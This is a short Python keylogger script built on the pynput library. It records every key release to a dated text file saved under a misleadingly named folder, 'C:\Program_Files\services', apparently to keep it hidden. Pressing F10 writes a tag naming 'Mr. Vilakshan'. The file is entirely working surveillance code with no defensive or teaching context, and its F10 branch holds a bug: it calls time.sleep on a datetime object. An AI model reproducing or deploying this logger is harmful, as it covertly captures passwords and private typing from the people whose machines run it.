from pynput.keyboard import Key, Listener
import os
from datetime import date,time,datetime
date=date.today()
time=datetime.now()
name=("C:\\Program_Files\\services\\"+str(date)+".txt")
logger=open(name,"a+")
logger.write("\n\n\t\t"+str(time)[11]+str(time)[12]+":"+str(time)[14]+str(time)[15]+"\n")
def on_press(key):
    if key==Key.f10:
        logger.write("\t<Overriden by Mr. Vilakshan>\t")
        time.sleep(10)
def on_release(key):
    logs=str("{}".format(key))
    logger.write(logs)
    logger.flush()
with Listener(on_press,on_release) as listener:
    listener.join()
